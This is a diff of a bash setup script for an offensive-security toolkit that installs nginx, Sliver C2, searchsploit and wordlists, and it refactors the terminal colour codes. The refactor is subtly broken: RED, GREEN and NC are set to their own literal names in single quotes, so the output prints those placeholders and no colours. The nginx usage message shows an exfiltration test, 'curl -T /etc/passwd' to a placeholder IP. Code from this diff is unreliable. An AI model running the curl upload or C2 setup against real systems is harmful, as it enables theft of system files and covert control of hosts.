@@ -4,10 +4,10 @@
 dldir="$HOME/Downloads"
 homedir="$HOME"
 kit_location="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-RED='\033[0;31m'
-GREEN='\033[0;32m'
+RED='${RED}'
+GREEN='${GREEN}'
 BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+NC=' ${NC}' # No Color
 
 
 source bash_tools.txt
@@ -24,8 +24,8 @@ function nginx_config {
     sudo systemctl restart nginx.service
     sudo rm /etc/nginx/sites-enabled/default
     # Usage
-    echo -e "\e[32mNGINX has been setup. To test the upload, try:\n"
-    echo -e "curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt\n\e[0m"
+    echo -e "${GREEN}NGINX has been setup. To test the upload, try:${NC}\n"
+    echo -e "${GREEN}curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt ${NC}\n"
 }
 
 
@@ -91,7 +91,7 @@ tool_install() {
                 return 0
             fi
         else
-            echo -e "\033[0;31mINVALID URL: $1\033[0m"
+            echo -e "${RED}INVALID URL: $1 ${NC}"
             # Returning 0 here because if the url isn't valid, then we definitely don't want to try installing
             return 0
         fi
@@ -101,10 +101,10 @@ tool_install() {
     for git_url in "${GITHUBS[@]}"; do
         echo "Checking for local install of: $git_url"
         if is_repo_installed "$git_url"; then
-            echo -e "\033[0;32mFound in current directory, continuing...\033[0m\n"
+            echo -e "${GREEN}Found in current directory, continuing...\n ${NC}"
         else
             git clone "$git_url"
-            echo -e "\033[0;32mRepo cloned! Moving on...\033[0m\n"
+            echo -e "${GREEN}Repo cloned! Moving on... \n ${NC}"
         fi
     done
     
@@ -118,16 +118,16 @@ tool_install() {
     apt_return_code=$?
     
     if [ "$apt_return_code" -ne 0 ]; then
-        echo -e "\033[0;31m[!] apt encountered an error while running. Information follows\033[0m"
-        echo -e "\033[0;31mapt return code: $apt_return_code\033[0m"
-        echo -e "\033[0;37mapt stdout:\n$apt_install_subproc\033[0m"
+        echo -e "${RED}[!] apt encountered an error while running. Information follows ${NC}"
+        echo -e "${RED}apt return code: $apt_return_code ${NC}"
+        echo -e "\033[0;37mapt stdout:\n$apt_install_subproc ${NC}"
     else
-        echo -e "\033[0;32m[*] apt installed packages successfully\033[0m"
+        echo -e "${GREEN}[*] apt installed packages successfully ${NC}"
     fi
     
     for pkg in "${PYPI_PACKAGES[@]}"; do
         pip3 install "$pkg" 1>/dev/null
-        echo -e "\033[0;32mPYPI $pkg successfully installed by script\033[0m"
+        echo -e "${GREEN}PYPI $pkg successfully installed by script ${NC}"
     done
     
     peas_download
@@ -142,7 +142,7 @@ tool_update() {
     nmap_update() {
         echo "Updating nmap script database"
         sudo nmap --script-updatedb 1>/dev/null
-        echo -e "\033[0;32mnmap script database updated\033[0m\n"
+        echo -e "${GREEN}nmap script database updated \n ${NC}"
     }
 
     rockyou() {
@@ -151,18 +151,18 @@ tool_update() {
             echo "It hasn't been decompressed - decompressing now..."
             sudo gunzip /usr/share/wordlists/rockyou.txt.gz
         else
-            echo -e "\033[0;32mrockyou has already been unzipped\033[0m"
-            echo -e "\033[0;32mSoftware & Tool updates have been completed!\033[0m"
+            echo -e "${GREEN}rockyou has already been unzipped ${NC}"
+            echo -e "${GREEN}Software & Tool updates have been completed! ${NC}"
         fi
     }
 
     echo "Updating searchsploit DB...."
     sudo searchsploit -u
-    echo -e "\033[0;32mFinished searchsploit update\033[0m"
+    echo -e "${GREEN}Finished searchsploit update ${NC}"
 
     echo "Updating locate DB..."
     sudo updatedb
-    echo -e "\033[0;32mFinished locate DB update\033[0m"
+    echo -e "${GREEN}Finished locate DB update ${NC}"
 
     nmap_update
     rockyou
@@ -192,25 +192,25 @@ c2_sliver_install() {
     # variable used for saving files
     c2_sliver_download_directory="$dldir/C2Frameworks"
 
-    echo -e "\033[0;32m[*] sliver: Installing sliver...\033[0m"
+    echo -e "${GREEN}[*] sliver: Installing sliver... ${NC}"
 
     # Try to install mingw-w64 package for more advanced features
-    echo -e "\033[0;32m[*] sliver: Installing mingw-w64 through apt\033[0m"
+    echo -e "${GREEN}[*] sliver: Installing mingw-w64 through apt ${NC}"
     sudo apt install -y mingw-w64 2>/dev/null 1>/dev/null
 
     # Clone source repo
-    echo -e "\033[0;32m[*] sliver: Cloning source and Wiki repos to $c2_sliver_download_directory\033[0m"
+    echo -e "${GREEN}[*] sliver: Cloning source and Wiki repos to $c2_sliver_download_directory ${NC}"
     git clone --quiet https://github.com/BishopFox/sliver.git "$c2_sliver_download_directory/sliver.git" 2>/dev/null >/dev/null
     # Wiki for documentation reference
     git clone --quiet https://github.com/BishopFox/sliver.wiki.git "$c2_sliver_download_directory/sliver.wiki.git" 2>/dev/null >/dev/null
 
     # Binary releases
-    echo -e "\033[0;32m[*] sliver: Downloading latest pre-compiled binary releases\033[0m"
+    echo -e "${GREEN}[*] sliver: Downloading latest pre-compiled binary releases ${NC}"
     wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -qP "$c2_sliver_download_directory"
     wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -qP "$c2_sliver_download_directory"
     wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe -qP "$c2_sliver_download_directory"
 
-    echo -e "\033[0;32m[*] sliver: Installation complete.\033[0m"
+    echo -e "${GREEN}[*] sliver: Installation complete. ${NC}"
     return 0
 }
 
@@ -241,24 +241,24 @@ sublime_install() {
 vscodium_install() {
     # Download the public GPG key for the repo and package if hasn't been downloaded already
     if [ ! -f '/usr/share/keyrings/vscodium-archive-keyring.gpg' ]; then
-        echo -e "\e[32m[*] Adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)\e[0m"
+        echo -e "${GREEN} [*] Adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)${NC}"
         wget -qO - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | gpg --dearmor | sudo dd of=/usr/share/keyrings/vscodium-archive-keyring.gpg 2>/dev/null
     else
-        echo -e "\e[32m[*] VSCodium GPG key already downloaded\e[0m"
+        echo -e "${GREEN} [*] VSCodium GPG key already downloaded${NC}"
     fi
 
     # Add the repository if it hasn't been already
     if [ ! -f '/etc/apt/sources.list.d/vscodium.list' ]; then
-        echo -e "\e[32m[*] Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/\e[0m"
+        echo -e "${GREEN} [*] Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/${NC}"
         echo 'deb [ signed-by=/usr/share/keyrings/vscodium-archive-keyring.gpg ] https://paulcarroty.gitlab.io/vscodium-deb-rpm-repo/debs vscodium main' | sudo tee /etc/apt/sources.list.d/vscodium.list 1>/dev/null
     else
-        echo -e "\e[32m[*] VSCodium repository already added\e[0m"
+        echo -e "${GREEN} [*] VSCodium repository already added${NC}"
     fi
 
     # Refresh available packages and install codium
-    echo -e "\e[32m[*] Installing VSCodium from repository\e[0m"
+    echo -e "${GREEN} [*] Installing VSCodium from repository${NC}"
     sudo apt update 2>/dev/null 1>/dev/null && sudo apt install codium -y 2>/dev/null 1>/dev/null
-    echo -e "\e[32m[*] VSCodium installed\e[0m"
+    echo -e "${GREEN} [*] VSCodium installed${NC}"
 }
 
 
